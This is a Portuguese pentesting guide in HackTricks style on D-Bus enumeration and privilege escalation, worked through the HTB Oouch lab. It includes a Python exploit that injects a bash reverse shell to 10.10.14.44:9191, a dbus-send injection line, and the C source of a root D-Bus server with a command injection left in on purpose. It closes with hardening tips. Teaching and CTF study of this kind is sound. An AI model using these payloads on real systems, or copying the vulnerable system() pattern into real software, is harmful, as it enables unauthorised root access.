# Enumeração do D-Bus e Escalonamento de Privilégios por Injeção de Comandos

{{#include ../../banners/hacktricks-training.md}}

## **Enumeração via GUI**

O D-Bus é utilizado como mediador de comunicações entre processos (IPC) em ambientes desktop Ubuntu. No Ubuntu, observa-se a operação simultânea de vários message buses: o system bus, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um session bus para cada usuário conectado, expondo serviços relevantes apenas para esse usuário específico. O foco aqui está principalmente no system bus, devido à sua associação com serviços executados com privilégios elevados (por exemplo, root), já que nosso objetivo é elevar privilégios. A arquitetura do D-Bus emprega um 'router' por session bus, responsável por redirecionar as mensagens dos clientes para os serviços apropriados, com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.

Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que expõem. Os objetos podem ser comparados a instâncias de classes em linguagens OOP padrão, sendo cada instância identificada exclusivamente por um **object path**. Esse caminho, semelhante a um caminho de sistema de arquivos, identifica exclusivamente cada objeto exposto pelo serviço. Uma interface importante para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que possui um único método, Introspect. Esse método retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto, com foco aqui nos métodos e omissão das propriedades e dos sinais.

Para a comunicação com a interface D-Bus, foram utilizadas duas ferramentas: uma ferramenta CLI chamada **gdbus**, para facilitar a invocação dos métodos expostos pelo D-Bus em scripts, e o [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada bus e exibir os objetos contidos em cada serviço.
```bash
sudo apt-get install d-feet
```
Se você estiver verificando o **session bus**, confirme primeiro o endereço atual:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na primeira imagem, são mostrados os serviços registrados no barramento de sistema do D-Bus, com **org.debin.apt** especificamente destacado após a seleção do botão System Bus. O D-Feet consulta esse serviço em busca de objetos, exibindo interfaces, métodos, propriedades e sinais dos objetos escolhidos, conforme visto na segunda imagem. A assinatura de cada método também é detalhada.

Um recurso importante é a exibição do **process ID (pid)** e da **command line** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, algo importante para a relevância da pesquisa.

**O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de enviá-los ao serviço.

No entanto, observe que **alguns métodos exigem autenticação** antes de permitir sua invocação. Ignoraremos esses métodos, pois nosso objetivo é elevar nossos privilégios sem credenciais desde o início.

Observe também que alguns serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ou não ter permissão para executar determinadas ações.

## **Enumeração da linha de comando**

### Listar objetos do serviço

É possível listar interfaces D-Bus abertas com:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Os serviços marcados como **`(activatable)`** são especialmente interessantes porque **ainda não estão em execução**, mas uma solicitação ao barramento pode iniciá-los sob demanda. Não pare em `busctl list`; mapeie esses nomes para os binários reais que eles executariam.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Isso informa rapidamente qual caminho `Exec=` será iniciado para um nome ativável e sob qual identidade. Se o binário ou sua cadeia de execução estiverem fracamente protegidos, um serviço inativo ainda poderá se tornar um caminho para privilege escalation.

#### Conexões

[Da wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando um processo configura uma conexão com um barramento, o barramento atribui à conexão um nome de barramento especial chamado _unique connection name_. Os nomes de barramento desse tipo são imutáveis — é garantido que não mudarão enquanto a conexão existir — e, mais importante, não podem ser reutilizados durante a existência do barramento. Isso significa que nenhuma outra conexão com esse barramento jamais receberá esse _unique connection name_, mesmo que o mesmo processo encerre a conexão com o barramento e crie uma nova. Os _unique connection names_ são facilmente reconhecíveis porque começam com o caractere de dois-pontos — que, de outra forma, é proibido.

### Informações do objeto de serviço

Em seguida, você pode obter algumas informações sobre a interface com:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Também correlacione o nome do barramento com sua unidade do `systemd` e o caminho do executável:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Isso responde à questão operacional que importa durante o privesc: **se uma chamada de método for bem-sucedida, qual binário e unidade reais executarão a ação?**

### Listar Interfaces de um Objeto de Serviço

Você precisa ter permissões suficientes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Interface de Introspecção de um Objeto de Serviço

Observe como, neste exemplo, foi selecionada a interface mais recente descoberta usando o parâmetro `tree` (_consulte a seção anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Observe o método `.Block` da interface `htb.oouch.Block` (a que nos interessa). O "s" das outras colunas pode significar que ela espera uma string.

Antes de tentar algo perigoso, valide primeiro um método **orientado à leitura** ou de baixo risco. Isso separa claramente três casos: sintaxe incorreta, alcançável, mas negado, ou alcançável e permitido.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlacionar Métodos D-Bus com Policies e Actions

A introspection informa **o que** você pode chamar, mas não informa **por que** uma chamada é permitida ou negada. Para uma triagem real de privesc, geralmente é necessário inspecionar **três camadas em conjunto**:

1. **Metadados de activation** (arquivos `.service` ou `SystemdService=`) para descobrir qual binary e unit serão realmente executados.
2. **Policy XML do D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) para descobrir quem pode usar `own`, `send_destination` ou `receive_sender`.
3. **Arquivos de actions do Polkit** (`/usr/share/polkit-1/actions/*.policy`) para descobrir o modelo de autorização padrão (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Comandos úteis:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Não assuma um mapeamento 1:1 entre um método D-Bus e uma ação do Polkit. O mesmo método pode escolher uma ação diferente dependendo do objeto que está sendo modificado ou do contexto de execução. Portanto, o fluxo de trabalho prático é:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` e grep nos arquivos `.policy` relevantes
3. probes live de baixo risco com `busctl call`, `gdbus call` ou `dbusmap --enable-probes --null-agent`

Serviços Proxy ou de compatibilidade merecem atenção especial. Um **proxy executado como root** que encaminha requisições para outro serviço D-Bus por meio de sua própria conexão pré-estabelecida pode fazer acidentalmente com que o backend trate toda requisição como proveniente do UID 0, a menos que a identidade do chamador original seja revalidada.

### Interface de Monitoramento/Captura

Com privilégios suficientes (apenas os privilégios `send_destination` e `receive_sender` não são suficientes), você pode **monitorar uma comunicação D-Bus**.

Para **monitorar** uma **comunicação**, você precisará ser **root**. Se ainda encontrar problemas sendo root, consulte [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se você souber como configurar um arquivo de configuração do D-Bus para **permitir que usuários não root capturem** a comunicação, **entre em contato comigo**!

Diferentes maneiras de monitorar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
No exemplo a seguir, a interface `htb.oouch.Block` é monitorada e **a mensagem "**_**lalalalal**_**" é enviada por meio de uma falha de comunicação**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Você pode usar `capture` em vez de `monitor` para salvar os resultados em um arquivo **pcapng** que o Wireshark pode abrir:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se houver informações demais no bus, passe uma match rule desta forma:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Várias regras podem ser especificadas. Se uma mensagem corresponder a _qualquer_ uma das regras, a mensagem será exibida. Assim:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulte a [documentação do D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para obter mais informações sobre a sintaxe das regras de correspondência.

### Mais

`busctl` tem ainda mais opções, [**encontre todas aqui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Cenário Vulnerável**

Como usuário **qtc dentro do host "oouch" do HTB**, você pode encontrar um **arquivo de configuração inesperado do D-Bus** localizado em _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Observação da configuração anterior: **você precisará ser o usuário `root` ou `www-data` para enviar e receber informações** por meio desta comunicação D-BUS.

Como o usuário **qtc** dentro do docker container `aeb4525789d8`, você pode encontrar algum código relacionado ao dbus no arquivo _/code/oouch/routes.py._ Este é o código interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como você pode ver, ele está **conectando-se a uma interface D-Bus** e enviando o "client_ip" para a função **"Block"**.

Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Esse código está **escutando** na conexão D-Bus **por um endereço IP e chamando o iptables por meio da função `system`** para bloquear o endereço IP fornecido.\
A chamada para `system` é **vulnerável intencionalmente a command injection**, portanto, um payload como o seguinte criará um reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

No final desta página, você pode encontrar o **código C completo da aplicação D-Bus**. Dentro dele, entre as linhas 91-97, você pode encontrar **como o `D-Bus object path`** **e o `interface name`** são **registrados**. Essas informações serão necessárias para enviar informações à conexão D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Além disso, na linha 57, você pode ver que **o único método registrado** para esta comunicação D-Bus é chamado de `Block`(_**Por isso, na seção seguinte, os payloads serão enviados ao objeto de serviço `htb.oouch.Block`, à interface `/htb/oouch/Block` e ao nome do método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

O código Python a seguir enviará o payload para a conexão D-Bus, para o método `Block`, por meio de `block_iface.Block(runme)` (_observe que ele foi extraído do trecho de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` é uma ferramenta usada para enviar mensagens ao “Message Bus”
- Message Bus – Um software usado pelos sistemas para facilitar a comunicação entre aplicações. Está relacionado ao Message Queue (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de subscription e também de forma muito rápida.
- A tag “-system” é usada para indicar que é uma mensagem do sistema, e não uma mensagem de sessão (por padrão).
- A tag “–print-reply” é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível por humanos.
- “–dest=Dbus-Interface-Block” O endereço da interface Dbus.
- “–string:” – O tipo de mensagem que queremos enviar à interface. Existem vários formatos para enviar mensagens, como double, bytes, booleans, int e objpath. Entre eles, o “object path” é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Nesse caso, podemos usar um arquivo especial (FIFO) para passar um comando à interface no nome de um arquivo. “string:;” – Isso serve para chamar novamente o object path, onde colocamos o arquivo/comando de reverse shell do FIFO.

_Note que em `htb.oouch.Block.Block`, a primeira parte (`htb.oouch.Block`) referencia o objeto de serviço, e a última parte (`.Block`) referencia o nome do método._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Ferramentas Automatizadas de Enumeration (2023-2025)

Fazer a Enumeration manual de uma grande attack surface de D-Bus com `busctl`/`gdbus` rapidamente se torna trabalhoso. Duas pequenas utilities FOSS lançadas nos últimos anos podem acelerar o processo durante engagements de red team ou CTF:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Escrito em C; binário estático único (<50 kB) que percorre todos os object paths, obtém o XML de `Introspect` e mapeia cada um para o PID/UID proprietário.
* Flags úteis:
```bash
# Lista todos os services no bus *system* e exibe todos os métodos callable
sudo dbus-map --dump-methods

# Faz probe ativo dos métodos/properties que você pode alcançar sem prompts do Polkit
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* A ferramenta marca well-known names desprotegidos com `!`, revelando instantaneamente services que você pode *own* (assumir o controle) ou method calls que podem ser alcançados a partir de um shell sem privilégios.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script escrito apenas em Python que procura paths *writable* em units do systemd **e** arquivos de policy do D-Bus excessivamente permissivos (por exemplo, `send_destination="*"`).
* Uso rápido:
```bash
python3 uptux.py -n          # executa todas as verificações, mas não grava um arquivo de log
python3 uptux.py -d          # ativa a saída de debug detalhada
```
* O módulo de D-Bus pesquisa os diretórios abaixo e destaca qualquer service que possa ser spoofed ou hijacked por um usuário comum:
* `/etc/dbus-1/system.d/` e `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bugs Notáveis de Privilege Escalation em D-Bus (2024-2025)

Acompanhar CVEs publicados recentemente ajuda a identificar padrões semelhantes e inseguros em código customizado. Dois bons exemplos recentes são:

| Ano | CVE | Componente | Causa raiz | Lição ofensiva |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | O service executado como root expunha uma interface D-Bus que usuários sem privilégios podiam reconfigurar, incluindo o carregamento de comportamento de macros controlado pelo atacante. | Se um daemon expõe **device/profile/config management** no system bus, trate configurações writable e funcionalidades de macros como primitivas de code execution, e não apenas como "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Um compatibility proxy executado como root encaminhava requests para backend services sem preservar o security context do caller original, fazendo com que os backends confiassem no proxy como UID 0. | Trate services D-Bus de **proxy / bridge / compatibility** como uma classe separada de bugs: se eles relay privileged calls, verifique como o UID/contexto do Polkit do caller chega ao backend. |

Padrões a observar:
1. O service é executado **como root no system bus**.
2. Ou **não há uma verificação de autorização**, ou a verificação é feita contra o **subject errado**.
3. O método alcançável acaba alterando o estado do sistema: instalação de packages, alterações de usuários/grupos, configuração do bootloader, atualizações de device profiles, gravações de arquivos ou execução direta de commands.

Use `dbusmap --enable-probes` ou um `busctl call` manual para confirmar se um método pode ser alcançado; em seguida, inspecione o XML de policy do service e as actions do Polkit para entender **qual subject** está realmente sendo autorizado.

---

## Hardening e Ganhos Rápidos de Detection

* Procure por policies world-writable ou abertas para *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Exija Polkit para métodos perigosos – até mesmo proxies *root* devem passar o PID do *caller* para `polkit_authority_check_authorization_sync()` em vez do próprio PID.
* Remova privilégios de helpers de longa execução (use `sd_pid_get_owner_uid()` para trocar namespaces após conectar-se ao bus).
* Se não puder remover um service, pelo menos restrinja seu escopo a um Unix group dedicado e limite o acesso em sua XML policy.
* Blue-team: capture o system bus com `busctl capture > /var/log/dbus_$(date +%F).pcapng` e importe-o no Wireshark para detecção de anomalias.

---

## Referências

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
